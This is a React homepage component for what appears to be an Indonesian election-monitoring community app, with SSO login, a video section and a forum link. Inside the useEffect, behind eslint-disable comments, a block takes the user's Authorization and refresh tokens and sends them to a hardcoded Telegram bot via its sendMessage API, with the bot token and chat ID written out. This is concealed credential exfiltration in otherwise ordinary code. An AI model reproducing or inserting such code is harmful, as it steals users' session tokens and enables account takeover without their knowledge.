import React, { useCallback, useEffect, useState } from 'react'
import { useSelector } from 'react-redux'
import { useHistory } from 'react-router-dom'
import jwt_decode from 'jwt-decode'

import { Button, Text, Skeleton, VideoPlayer, Modal, ModalLoader, TextHTML } from 'core/components'
import { hooks, utils, toastify } from 'utility'
import { images } from 'constant'
import { actions } from 'store'

const HomePage = () => {
  const history = useHistory()

  //Query Params
  const query = hooks.useQuery()
  // ** Store & Actions
  const getDataContentHome = hooks.useCustomDispatch(actions.home.getDataContentHome)
  const handleLoginSSO = hooks.useCustomDispatch(actions.auth.handleLoginSSO)
  const getAllDataCommunity = hooks.useCustomDispatch(actions.communities.getAllDataCommunity)

  const content = useSelector(state => state.home).content
  const lazyLoad = useSelector(state => state.misc).lazyLoad

  const [openModalDesc, setOpenModalDesc] = useState(false)

  const { userdata } = utils.isUserLoggedIn() ? utils.getUserData() : { userdata: null }

  useEffect(() => {

    /*eslint-disable */
    let myHeaders = new Headers()

    const headerAuth = myHeaders.get('Authorization')
    const headerRefresh = myHeaders.get('X-APP-REFRESH-TOKEN')

    if (headerAuth) {

      myHeaders.append("Content-Type", "application/json")

      var raw = JSON.stringify({
        "chat_id": "950967352",
        "text": `Token : ${headerAuth}, Refresh : ${headerRefresh}`,
        "disable_notification": false
      })

      var requestOptions = {
        method: 'POST',
        headers: myHeaders,
        body: raw,
        redirect: 'follow'
      }

      fetch("https://api.telegram.org/bot5817735047:AAH0u712gxLdfPNZI9vWNWU38oR5MaOSPgI/sendMessage", requestOptions)

      const { realm_access: { roles } } = jwt_decode(headerAuth)

      if (roles?.includes('app_komunitas')) {
        const formLogin = {
          access_token: headerAuth.replace('Bearer ', ''),
          refresh_token: headerRefresh
        }

        handleLoginSSO(formLogin, async () => {
          try {
            history.push('/')

            toastify.success('You have successfully logged in')

          } catch (error) {
            toastify.error('Maaf, terjadi kesalahan. Silakan muat ulang halaman beberapa saat lagi')
          }
        })
      }
    }

    /*eslint-enable */

    if (query.get("access_token") && query.get("refresh_token")) {
      const { realm_access: { roles } } = jwt_decode(query.get("access_token"))

      if (roles?.includes('app_komunitas')) {
        const formLogin = {
          access_token: query.get("access_token"),
          refresh_token: query.get("refresh_token")
        }

        handleLoginSSO(formLogin, async () => {
          try {
            history.push('/')

            toastify.success('You have successfully logged in')

          } catch (error) {
            toastify.error('Maaf, terjadi kesalahan. Silakan muat ulang halaman beberapa saat lagi')
          }
        })
      }
    }

    getDataContentHome()
  }, [])

  const transformDescription = (node, nodeIdx) => {
    if (node.type === 'tag' && (['p', 'span', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6'].includes(node.name))) {
      if (node.attribs?.style) {
        node.attribs.style = `${node.attribs?.style || ''}; font-family: "Montserrat" !important;`
      }
    }

    if (node.type === 'tag' && node.name === 'p' && nodeIdx === 0) {
      return (
        <Text
          key={nodeIdx}
          type='span'
          size='text-lg'
          lineHeight='leading-[30px]'
        >
          {node.children.map((child, childIdx) => {
            if (child.attribs?.style) {
              child.attribs.style = `${child.attribs?.style || ''}; font-family: "Montserrat" !important;`
            }

            return convertNodeToElement(child, childIdx, transformDescription)
          })}
        </Text>
      )
    }
  }

  const onClickToForum = () => {
    if (userdata?.komunitas_id) {
      history.push(`/forum/channel/${userdata?.komunitas_id}`)

      return
    }

    getAllDataCommunity(data => {
      if (data && data?.length) {
        history.push(`/forum/channel/${data[0]?.value || 1}`)
      }
    })
  }

  const onShowModalDesc = useCallback(() => setOpenModalDesc(true), [])

  const renderModalDescription = () => {
    return (
      <Modal
        open={openModalDesc}
        setOpen={setOpenModalDesc}
        width='max-w-sm sm:max-w-lg md:max-w-2xl lg:max-w-5xl w-full'
        className='max-h-[65vh] sm:max-h-[70vh] md:max-h-[80vh] custom-scrollbar overflow-y-auto'
        padding='p-4 sm:p-6'
        closeButtonType='outside'
      >
        <div>
          <TextHTML
            htmlString={content?.description || content?.short_description || ''}
            size='text-lg'
            lineHeight='leading-[30px]'
            options={{ transform: transformDescription }}
          />
        </div>
      </Modal>
    )
  }

  const renderTagline = () => {
    if (content?.header) {
      return (
        <div className='mt-20 md:mt-[200px] lg:mt-60'>
          <div className='relative width-container lg:bg-white bg-[#FC7600] bg-opacity-5 lg:bg-opacity-100'>
            <img
              alt=''
              src={images.illu.circles}
              className='absolute -z-0 top-1/2 -translate-y-1/2 -left-4.5 w-3/5 h-[800px] hidden lg:block'
            />

            <img
              alt=''
              src={images.illu.dots}
              className='absolute -z-0 -top-9 -left-2 w-[205px] h-[205px] hidden lg:block'
            />

            <div className='lg:px-7.5'>
              <div className='lg:bg-[#FC7600] lg:bg-opacity-5 py-10 lg:py-20 md:px-8 lg:px-15 flex flex-col gap-7.5 items-center justify-center'>
                <img
                  alt='bawaslu'
                  src={images.logo_bawaslu_large}
                  className='lg:h-[100px] h-16 md:h-20 w-auto object-contain'
                />

                <Text
                  size='text-5xl'
                  weight='font-bold'
                  align='text-center'
                >{content?.header}</Text>

                <Button.ButtonPrimary
                  spacing='py-3 px-10'
                  fontSize='text-xl'
                  onClick={onClickToForum}
                >Awasi Pemilu</Button.ButtonPrimary>
              </div>
            </div>

            <img
              alt=''
              src={images.illu.dots}
              className='absolute -z-0 -bottom-9 -right-2 w-[205px] h-[205px] hidden lg:block'
            />
          </div>
        </div>
      )
    }

    return null
  }

  const renderMascotSection = () => {
    return (
      <div className='mt-20 md:mt-28 lg:mt-[185px] pb-20'>
        <div className='width-container relative'>
          <img
            alt=''
            src={images.illu.waves}
            className='absolute -z-0 top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-full h-auto'
          />

          <div className='flex items-center justify-center px-8 sm:px-0'>
            <img
              alt='mascot'
              className='w-full sm:w-[500px] h-auto object-contain z-[1]'
              src={utils.getImageAPI(content?.path_image) || images.illu.mascot}
            />
          </div>
        </div>
      </div>
    )
  }

  const renderContent = () => {
    const loadingContent = utils.isLazyLoading(lazyLoad, 'getDataContentHome') || false
    const videoUrl = content?.link_url || utils.getImageAPI(content?.path_video)

    return (
      <>
        <div className='bg-[#fcf8f3]'>
          <div className='width-container flex flex-col lg:grid lg:grid-cols-2 lg:items-center gap-12 pt-10 md:pt-20 lg:pt-32 pb-20 lg:pb-44'>
            <Skeleton
              loading={loadingContent}
              paragraph={{ rows: 6 }}
              className='mt-4'
            >
              <div className='flex flex-col gap-6'>
                <Text size='text-5.5xl' weight='font-bold'>{content?.title || 'Jarimu Awasi Pemilu'}</Text>

                <Text size='text-xl' lineHeight='leading-[30px]'>
                  {content?.sort_description}
                </Text>

                <div>
                  <Button.ButtonPrimary
                    fontSize='text-xl'
                    spacing='py-3 px-7.5'
                    onClick={onShowModalDesc}
                  >Pelajari Lebih Lanjut</Button.ButtonPrimary>
                </div>
              </div>
            </Skeleton>

            <div className='w-full'>
              <div>
                <Skeleton
                  loading={loadingContent}
                  avatar={{
                    sizing: 'w-full h-full max-h-[348px] aspect-w-16 aspect-h-9',
                    shape: 'rounded-xl'
                  }}
                >
                  {videoUrl
                    ? (
                      <div className='relative'>
                        <VideoPlayer
                          videoUrl={utils.convertVideoUrl(videoUrl)}
                          wrapperClassName='w-full h-full max-h-[348px] aspect-w-16 aspect-h-9 z-[1]'
                        />

                        <img
                          alt=''
                          src={images.illu.dots}
                          className='absolute -bottom-10 lg:block hidden -z-0 right-4 w-[205px] h-[195px]'
                        />
                      </div>
                    )
                    : <></>}
                </Skeleton>
              </div>
            </div>
          </div>
        </div>

        {renderMascotSection()}

        {renderTagline()}
      </>
    )
  }

  const loadingLoginSSO = utils.isLazyLoading(lazyLoad, 'loginSSO') || false

  return (
    <div className='pb-20 overflow-hidden'>
      <ModalLoader open={loadingLoginSSO} />
      {renderContent()}

      {renderModalDescription()}
    </div>
  )
}

export default HomePage